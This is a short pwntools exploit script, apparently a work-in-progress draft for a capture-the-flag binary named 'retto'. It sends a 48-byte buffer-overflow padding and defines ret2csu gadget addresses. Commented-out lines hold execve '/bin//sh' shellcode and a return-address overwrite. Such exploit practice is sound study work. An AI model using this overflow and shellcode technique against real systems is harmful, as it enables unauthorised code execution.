from pwn import *


#for j in range(0, 1000):

#target = remote('cweaccessionsctf.com', '1340')
target = process('./retto')


app_base = 0x400000
libc_offset = 0x11d0
scanf_offset = 0x4028
csuGadget0 = p64(0x401222)
csuGadget1 = p64(0x401208)

initPtr = p64(0x403e38)


print(target.recvuntil("how to win here?"))
#leak = target.recvline()
#leak = leak.decode('utf8').strip(" \n")
#print(leak)
#memAddress = int(leak ,16)
#print(memAddress)

#payload = ""
payload = b'A'*(48)
#payload += p64(0x00000000)
#payload += b'A'*(52)



#payload += b'A'*(100)
#payload = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
#payload += b'A'*(0x38 - len(payload))
#payload += p32(memAddress)

#encoded = bytes(payload, 'utf-8')
#encoded += p32(memAddress)

target.sendline(payload)
print(target.recv())
print(target.recv())
#target.interactive()
target.close()
#while True:	
	#if s.endswith(b'0'):
	#	answer = bytes.fromhex('abf0483b3ddb9cf938b9633aa951d000') #'b8 84 81 0'
	#	r.sendline(answer)


